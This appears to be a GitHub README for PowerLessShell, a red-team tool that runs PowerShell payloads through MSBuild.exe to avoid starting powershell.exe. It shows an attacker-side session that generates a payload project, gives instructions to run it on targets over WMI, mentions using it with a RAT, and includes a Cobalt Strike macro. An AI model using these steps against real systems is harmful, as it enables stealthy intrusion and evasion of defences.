# PowerLessShell

PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawing powershell.exe

# Usage

Attacker side
```
$ python PowerLessShell.py


PowerLessShell - Remain Stealth
         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"



(Path to the PowerShell script)>>> powershell.ps1

(Path for the generated MsBuild out file)>>> payload.csproj


[+] payload.csproj was generated.
[+] payload.csproj.cmd was generated.
[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
```

# Example

The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell

![PowerLessShell](https://ringzer0team.com/powershellless.png)

# Cobalt Strike Aggressor script By MrT-F
```
In the beacon console once the cna script is uploaded

use macro "wmi_msbuild [target] [listener]"
```

# TODO 
Use impacket library to automate the file push and execution of the msbuild command.

# Credit
Mr.Un1k0d3r RingZer0 Team 2017

